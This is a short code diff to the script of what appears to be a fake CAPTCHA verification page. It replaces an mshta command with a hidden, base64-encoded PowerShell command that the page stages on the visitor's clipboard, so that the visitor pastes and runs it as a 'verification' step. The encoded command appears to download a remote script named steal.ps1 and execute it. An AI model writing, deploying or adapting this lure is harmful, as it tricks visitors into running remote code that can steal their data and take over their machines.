@@ -419,9 +419,8 @@
             var verification_id = generateRandomNumber();
             document.getElementById('verification-id').textContent = verification_id;
             
-            const htaPath = window.location.origin + "/recaptcha-verify";
-            const commandToRun = "mshta " + htaPath
-            stageClipboard(commandToRun, verification_id)
+            const commandToRun = "powershell -w hidden -enc cABvAHcAZQByAHMAaABlAGwAbAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBlAG4AYwAgACQAeAA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAHUAPQAnAGgAdAB0AHAAcwA6AC8ALwB2AGUAcgBpAGYAeQAuAHQAeQBjAGUAbgBvADgAOQAuAHcAbwByAGsAZQByAHMALgBkAGUAdgAvAHMAdABlAGEAbAAuAHAAcwAxACcAOwAkAHMAPQAkAHgALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAkAHUAKQA7AGkAZQB4ACAAJABzAA==";
+stageClipboard(commandToRun, verification_id)
         }
 
         addCaptchaListeners();
